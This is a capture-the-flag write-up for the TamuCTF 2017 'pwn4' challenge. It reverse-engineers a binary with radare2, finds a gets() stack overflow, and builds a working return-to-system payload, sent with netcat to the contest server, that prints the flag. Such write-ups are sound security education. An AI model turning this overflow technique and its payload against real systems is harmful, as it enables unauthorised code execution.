---
author:
  email: tzaoh1@gmail.com
  github: https://github.com/tzaoh
  image:
  - /images/avatar-64x64.png
  name:
  - Tzaoh
cardbackground: 'default'
cardbackground2: 'white'
cardtitlecolor: 'orange'
post_categories:
- CTFs
date: 2017-08-11T18:56:18+02:00
description: TamuCTF 2017 - pwn4
tags:
- CTF
- TamuCTF
- 2017
title: "TamuCTF 2017 - Pwn 4"
summary: "Is curious that this specific challenge had more value than the previous one ([pwn3](../pwn3/pwn3.md)). As we will see it was way easier."
cardthumbimage: "/assets/TamuCTF2017/title.png"
---

![Pwn4 challenge description](/assets/TamuCTF2017/pwn4/1-pwn4_description.png) 

Is curious that this specific challenge had more value than the previous one ([pwn3](../pwn3/pwn3.md)).  
As we will see below, it was way easier. Lets take a look with r2.

```bash
$ wget -q https://github.com/BlackHoods/BlackHoods.github.io/raw/master/assets/TamuCTF2017/pwn4/pwn4
$ r2 -A -c 'afl' pwn4
```

{{< highlight r2 "hl_lines=28 29 30 31" >}}
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
0x08048330    3 35           sym._init
0x08048353    1 25           fcn.08048353
0x0804836c    1 4            sub.gets_12_36c
0x08048370    1 6            sym.imp.gets
0x08048376    2 10   -> 22   fcn.08048376
0x08048380    1 6            sym.imp.puts
0x08048386    2 10   -> 22   fcn.08048386
0x08048390    1 6            sym.imp.system
0x08048396    2 10   -> 22   fcn.08048396
0x080483a0    1 6            sym.imp.__libc_start_main
0x080483a6    2 10   -> 22   fcn.080483a6
0x080483b0    1 6            sym.imp.setvbuf
0x080483b6    2 10   -> 22   fcn.080483b6
0x080483c0    1 1            sub.__gmon_start___252_3c0
0x080483c1    1 15           fcn.080483c1
0x080483d0    1 33           entry0
0x080483f1    1 1            fcn.080483f1
0x08048400    1 4            sym.__x86.get_pc_thunk.bx
0x08048410    4 43           sym.deregister_tm_clones
0x0804843c    4 57           fcn.0804843c
0x08048475    3 41           fcn.08048475
0x080484a0    8 43   -> 93   sym.frame_dummy
0x080484cb    1 25           sym.flag_func
0x080484e4    1 25           sym.func2
0x080484fd    1 24           sym.func1
0x08048515    1 71           sym.main
0x08048560    4 93           sym.__libc_csu_init
0x080485bd    1 5            fcn.080485bd
0x080485c2    1 22           fcn.080485c2
{{< /highlight >}}

We can see four interesting functions:

{{< highlight r2 "hl_lines=10 12 41 71" >}}
[0x080483d0]> s sym.flag_func; Vp
[0x080484cb 16% 240 pwn4]> pd $r @ sym.flag_func                         
┌ (fcn) sym.flag_func 25
│   sym.flag_func ();
│           0x080484cb      55             push ebp
│           0x080484cc      89e5           ebp = esp                       
│           0x080484ce      83ec08         esp -= 8                     
│           0x080484d1      83ec0c         esp -= 0xc                 
│         ; "/bin/cat flag2.txt"        
│           0x080484d4      68e0850408     push str._bin_cat_flag2.txt
│         ; int system(const char *string) ; sym.imp.system
│           0x080484d9      e8b2feffff     sym.imp.system ()
│           0x080484de      83c410         esp += 0x10
│           0x080484e1      90                                   
│           0x080484e2      c9                                   
└           0x080484e3      c3                                     
┌ (fcn) sym.func2 25                                             
│   sym.func2 ();                                                
│           0x080484e4      55             push ebp              
│           0x080484e5      89e5           ebp = esp             
│           0x080484e7      83ec08         esp -= 8              
│           0x080484ea      83ec0c         esp -= 0xc            
│           0x080484ed      68f3850408     push str.Nothing_to_see_here
│         ; int puts(const char *s)                      
│           0x080484f2      e889feffff     sym.imp.puts ()
│           0x080484f7      83c410         esp += 0x10
│           0x080484fa      90                                               
│           0x080484fb      c9                                   
└           0x080484fc      c3                                   
┌ (fcn) sym.func1 24
│   sym.func1 ();
│           ; var int local_ch @ ebp-0xc
│              ; CALL XREF from 0x0804854a (sym.main)
│           0x080484fd      55             push ebp
│           0x080484fe      89e5           ebp = esp
│           0x08048500      83ec18         esp -= 0x18
│           0x08048503      83ec0c         esp -= 0xc
│           0x08048506      8d45f4         eax = [local_ch]
│           0x08048509      50             push eax
│         ; char*gets(char *s)
│           0x0804850a      e861feffff     sym.imp.gets ()           
│           0x0804850f      83c410         esp += 0x10
│           0x08048512      90                        
│           0x08048513      c9                        
└           0x08048514      c3                          
┌ (fcn) sym.main 71         
│   sym.main ();
│           ; var int local_4h_2 @ ebp-0x4
│           ; var int local_4h @ esp+0x4
│              ; DATA XREF from 0x080483e7 (entry0)
│           0x08048515      8d4c2404       ecx = [local_4h]
│           0x08048519      83e4f0         esp &= 0xfffffff0
│           0x0804851c      ff71fc         push dword [ecx - 4]
│           0x0804851f      55             push ebp
│           0x08048520      89e5           ebp = esp
│           0x08048522      51             push ecx
│           0x08048523      83ec04         esp -= 4
│           0x08048526      a13ca00408     eax = dword obj.stdout
│           0x0804852b      6a00           push 0
│           0x0804852d      6a00           push 0
│           0x0804852f      6a02           push 2
│           0x08048531      50             push eax
│         ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)
│           0x08048532      e879feffff     sym.imp.setvbuf ()
│           0x08048537      83c410         esp += 0x10
│           0x0804853a      83ec0c         esp -= 0xc
│           0x0804853d      6807860408     push str.I_require_an_input:
│         ; int puts(const char *s)
│           0x08048542      e839feffff     sym.imp.puts ()
│           0x08048547      83c410         esp += 0x10
│           0x0804854a      e8aeffffff     sym.func1 ()
│           0x0804854f      b800000000     eax = 0
│           0x08048554      8b4dfc         ecx = dword [local_4h_2]
│           0x08048557      c9                                     
│           0x08048558      8d61fc         esp = [ecx - 4]
└           0x0804855b      c3                                               
{{< /highlight >}}

> By the way the command `s sym.flag_func; Vp` can be splitted and explained like this:  
> `s sym.flag_func` - set the position of the cursor at the beginning of the function.  
> `V` - Change the visual mode.  
> `p` - change mode view.

Here they are, lets take a look at those functions.

Obviously we should try to execute `sym.flag_func()` function, it seems it will try print a file called `flag2.txt` (strange name right? why 2?) using the `cat` command on the remote server. But that function is never called. You can check it by yourself with:
```r2
[0x080484f7]> axt sym.flag_func
```

Then we need to dig a bit more.

1. `sym.func2()` is just printing a message (it even tells you not to waste your time with it). So we can ignore this one.
2. `sym.func1()` is a bit more interesting because it is using the unsecure function `gets()`. If it is called somewhere, we would be able to overwrite the `$eip` register.
3. We dont need to cross our fingers a lot of time because we fastly see that `sym.func1()` is being called from `main()`! yay! :v: .

Lets figure out, how many bytes do we need to overwrite `$eip` register.
```bash
$ pwn cyclic 40 ; To generate string with unique subsequences.
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa
$ r2 -R "stdin=\"`pwn cyclic 40`\"" -A -d -c 'dc' pwn4
```
{{< highlight r2 "hl_lines=18 19" >}}
Process with PID 12102 started...
= attach 12102 12102
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /root/pwn4
asm.bits 32
[x] Analyze all flags starting with sym. and entry0 (aa)
TODO: esil-vm not initialized
[Cannot determine xref search boundariesr references (aar)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
ptrace (PT_ATTACH): Operation not permitted
= attach 12102 12102
I require an input:
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x61616165 code=1 ret=0
[0x61616165]>
{{< /highlight >}}

```bash
$ pwn cyclic -l 0x61616165
16
```

So, we can overwrite the `$eip` register writing the next 4 bytes (from byte 17 to 20)!  
Now we create a file with the previously commented file (`flag2.txt`) to try this out.

{{< highlight bash "hl_lines=4" >}}
$ echo This is the flag > flag2.txt
$ python -c 'print("A"*16 + "\xcb\x84\x04\x08")' | ./pwn4
I require an input:
This is the flag
Segmentation fault
{{< /highlight >}}

Good! what will the remote server say?
```bash
$ python -c 'print("A"*16 + "\xcb\x84\x04\x08")' | nc pwn.ctf.tamu.edu 4324
I require an input:                                                                              Did you really think it would be that easy?
```

Ouch! that file was just a decoy. There must be a another one named `flag.txt` waiting for us.
> But how could we executed it? There is only one function which print a file and its name is hardcoded.

Well, that is not a problem, because there is a call to `system()`.
The only thing we need to do is to pass a different argument: `cat flag.txt` instead of `cat flag2.txt`.

If you inspect all the strings of the binary you may find surprise:

{{< highlight r2 "hl_lines=5" >}}
[0x61616165]> iz
vaddr=0x080485e0 paddr=0x000005e0 ordinal=000 sz=19 len=18 section=.rodata type=ascii string=/bin/cat flag2.txt
vaddr=0x080485f3 paddr=0x000005f3 ordinal=001 sz=20 len=19 section=.rodata type=ascii string=Nothing to see here
vaddr=0x08048607 paddr=0x00000607 ordinal=002 sz=20 len=19 section=.rodata type=ascii string=I require an input:
vaddr=0x0804a028 paddr=0x00001028 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
{{< /highlight >}}

As you may know, in order to pass the arguments to `system` they need to be pushed into the stack. In case of a string not its value but its reference (a pointer `0x0804a028` in this case).

Because we can overwrite the stack we can "imitate" a push into it:

1. Instead of starting in the address of `sym.flag_func()` (`0x080484cb`) we will use `system()` one (`0x080484d9`).  
`$ python -c 'print("A"*16 + "\xd9\x84\x04\x08")'`  
2. We need to push the pointer to the string to indicate `system()` which is its argument.  
`$ python -c 'print("A"*16 + "\xd9\x84\x04\x08" + "\x28\xa0\x04\x08")'`

Lets send to the server:
```bash
$ python -c 'print("A"*16 + "\xd9\x84\x04\x08" + "\x28\xa0\x04\x08")' | nc pwn.ctf.tamu.edu 4324
I require an input:
gigem{R3TURN_0R13NT3D_PR0F1T}
```

Answer: gigem{R3TURN_0R13NT3D_PR0F1T}

### Complete video
<a href="https://asciinema.org/a/drr8rhjxvoqpmu6ke8czn6hwf?autoplay=1" target="_blank"><img src="https://asciinema.org/a/drr8rhjxvoqpmu6ke8czn6hwf.png" /></a>


### Tools used and some references:

 * [radare2](https://github.com/radare/radare2) - To analyze the binary.
 * [pwntools](https://github.com/Gallopsled/pwntools) and [cyclic](http://docs.pwntools.com/en/stable/util/cyclic.html#pwnlib.util.cyclic.cyclic) - To generate unique substrings.
 * [asciinema](https://asciinema.org) - To record the session.
